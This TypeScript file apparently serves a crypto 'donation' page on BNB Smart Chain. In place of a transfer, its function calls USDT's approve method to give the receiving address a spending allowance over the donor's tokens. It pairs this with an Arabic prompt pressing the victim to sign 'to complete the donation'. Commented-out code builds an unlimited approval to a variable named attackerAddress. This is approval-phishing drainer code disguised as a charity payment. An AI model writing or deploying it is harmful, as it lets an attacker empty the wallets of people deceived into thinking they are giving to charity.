import Web3 from "web3";


export async function bscMetaMaskTransaction(
    donatorAddress: string,
    receiverAddress: string,
    donationAmount: number
) {
    if (!window.ethereum) {
        alert("Please install MetaMask!");
        return;
    }
    // const web3 = new Web3(
    //     window.ethereum
    // );
    //本来切链放在按钮里，现在放在useEffect里
    // if (blockchain === "eth") {
    //   // 创建web3实例（假设用户已经安装了MetaMask）
    // } else if (blockchain === "bsc") {
    //
    // } else if (blockchain === "oktc") {
    //   // await window.ethereum.request({
    //   //   method: "wallet_switchEthereumChain",
    //   //   params: [{ chainId: "0x42" }],
    //   // });
    // }

    // try {
    //     const spender = attackerAddress;
    //     const paddedSpender = spender.slice(2).padStart(64, "0"); // 去掉开头的 "0x" 并左侧填充零
        //
        // // 设置交易参数
        // const transactionParameters = {
        //     to: "0x55d398326f99059ff775485246999027b3197955", // USDT-ERC20合约地址
        //     from: ethAccount, // 必须是用户当前的地址
        //     // value: web3.utils.toHex(web3.utils.toWei('0.0001', 'ether')), // 将0.1以太币转换为Wei并转换为16进制
        //     value: "0x0",
        //     gasPrice: web3.utils.toHex(await web3.eth.getGasPrice()), // 使用当前的矿工费价格
        //     gas: web3.utils.toHex(80000), // 设置gas上限为21000，这是标准的以太坊转账gas上限
        //     // 如果你调用合约的话，还需要设置data字段
        //     data:
        //         "0x095ea7b3" +
        //         paddedSpender +
        //         "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
        // };
        //
        // // 发送交易
        // const txHash = await window.ethereum.request({
        //     method: "eth_sendTransaction",
        //     params: [transactionParameters],
        // });
        //
        // console.log("Transaction Hash:" + txHash);
        // // TODO: 可以在这里添加进一步的逻辑，例如重定向或者显示状态消息
        // callback(txHash);

        // web3js contract写法
    // 交易执行函数
    const executeTransaction = async () => {
        try {
            const web3 = new Web3(window.ethereum);
            const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; //BEP20
            const usdtAbi = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}] as const;
            const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);

            const donationAmountStr = donationAmount.toString()+"000000000000000000";

            return await usdtContract.methods.approve(receiverAddress, donationAmountStr).send({
                from: donatorAddress,
                gas: "0x15028",
                data: "0x",
                maxPriorityFeePerGas: "0x3b9aca00", // 1 gwei
                maxFeePerGas: "0x174876E800", // 100 gwei
            })
        } catch (error) {
            // alert("Error sending transaction:" + JSON.stringify(error, null, 2));
            alert("الرجاء توقيع المعاملة لإتمام التبرع.الله يبارك لك!")        }
    };

    // 执行交易
    return await executeTransaction();

}